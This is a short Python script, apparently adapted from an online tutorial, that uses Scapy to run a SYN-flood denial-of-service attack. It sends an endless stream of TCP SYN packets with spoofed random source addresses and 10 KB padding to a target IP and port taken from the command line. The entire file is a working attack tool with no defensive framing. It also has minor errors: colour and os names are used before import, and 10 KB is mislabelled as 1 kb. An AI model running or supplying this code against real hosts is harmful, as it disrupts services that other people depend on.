#!/bin/python3
# tutorial taken from https://www.thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python
# denial of service via syn flood written in python using scapy

# scapy check
try:
	import scapy
	# scapy installed
	pass
except ModuleNotFoundError:
	# scapy not installed
	print(F.RED + S.BRIGHT + "Scapy not installed. Installing..." + S.RESET_ALL)
	os.system("pip3 install scapy")
	pass

from scapy.all import *
import os, sys
from colorama import Fore as F
from colorama import Style as S


# begin code

# take target ip and port from first and second arguments
target_ip = str(sys.argv[1])
target_port = int(sys.argv[2])

# create ip packet with spoofed src ip address
ip = IP(src=RandIP("192.168.1.1/16"), dst=target_ip)

# create tcp syn packet with a random source port
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

# add raw data to assist in flooding
raw_data = Raw(b"X"*1024*10) # 1 kb

# stack the layers
packet = ip/tcp/raw_data

#send the packet
print(F.GREEN + S.BRIGHT + "[+] " + S.RESET_ALL + "sending packets")
send(packet, loop=1, verbose=1)